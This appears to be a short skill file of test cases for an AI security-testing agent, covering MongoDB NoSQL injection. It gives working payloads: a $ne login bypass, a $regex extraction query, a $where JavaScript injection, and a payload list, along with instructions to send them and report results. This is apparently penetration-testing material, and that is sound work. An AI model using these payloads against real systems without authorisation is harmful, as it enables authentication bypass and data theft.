# NoSQL Injection Hunting Skill — 3 Test Cases

> Load when: NoSQL, MongoDB, CouchDB, injection.

## 256. MongoDB operator injection (easy)
Send `{"username":"admin","password":{"$ne":""}}` in login. Report auth bypass.

## 257. MongoDB regex injection (easy)
Send `{"username":{"$regex":".*"}}` in login. Report data extraction.

## 258. MongoDB $where injection (medium)
Send `{"$where":"this.password == 'pass'"}` in query. Report if JavaScript execution is possible.

---

## NoSQL Injection Payloads
```json
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "this.password == 'pass'"}
{"$exists": true}
```
